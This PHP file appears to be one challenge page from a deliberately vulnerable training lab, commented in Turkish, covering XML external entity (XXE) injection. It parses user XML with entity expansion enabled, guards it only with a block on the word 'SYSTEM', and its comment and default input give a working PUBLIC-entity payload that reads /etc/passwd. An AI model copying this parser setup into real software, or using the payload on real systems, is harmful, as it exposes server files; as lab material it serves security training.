<?php
/**
 * XXE — MEDIUM
 * KASITLI BOZUK SAVUNMA: 'SYSTEM' anahtar kelimesi bloklanır.
 * Bypass: 'PUBLIC' identifier kullan —
 *   <!DOCTYPE r [<!ENTITY xxe PUBLIC "x" "file:///etc/passwd">]>
 */
$default = "<?xml version=\"1.0\"?>\n<!DOCTYPE r [<!ENTITY xxe PUBLIC \"x\" \"file:///etc/passwd\">]>\n<r>&xxe;</r>";
$xml = $_POST['xml'] ?? $default;

echo '<p>"Savunma": <code>SYSTEM</code> içeren XML reddedilir.</p>';
echo '<form method="post"><textarea name="xml" rows="5" cols="70">' . e($xml) . '</textarea><br><button type="submit">Parse</button></form>';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ids_log('xxe', $xml);
    if (strpos($xml, 'SYSTEM') !== false) {
        echo '<div class="result detected">Reddedildi: SYSTEM identifier yasak.</div>';
    } else {
        libxml_use_internal_errors(true);
        $doc = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_DTDLOAD);
        if ($doc === false) {
            echo '<div class="result detected">XML parse hatası.</div>';
        } else {
            $content = (string) $doc;
            echo '<div class="result">' . e($content) . '</div>';
            if (preg_match('/root:.*:0:0:/', $content)) {
                mark_solved('xxe');
                echo '<div class="result">✅ PUBLIC ile blocklist aşıldı — challenge çözüldü!</div>';
            }
        }
    }
}
